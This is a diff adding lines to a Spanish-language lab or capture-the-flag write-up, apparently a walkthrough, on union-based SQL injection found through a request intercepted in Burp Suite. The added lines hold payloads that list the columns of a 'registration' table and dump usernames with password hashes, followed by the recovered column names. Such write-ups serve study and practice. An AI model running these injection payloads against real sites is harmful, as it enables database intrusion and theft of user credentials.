@@ -22,10 +22,16 @@ Interceptamos la petición con Burpsuite, y vemos que en el campo de selección 
 
 `' union select table_name from information_schema.tables where table_schema="registration"-- -` Enumerar las tables de la base de datos registration.
 
+`union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -` Enumerar las columnas
+
+`' union select group_concat(username,0x3a,userhash) from registration-- -` Obtener los valores de las columnas
 
 BBDD:
 `registration`
 Tables:
 `registration`
 Columns:
+`username` `userhash` `country` `regtime`
+Valores:
+
 
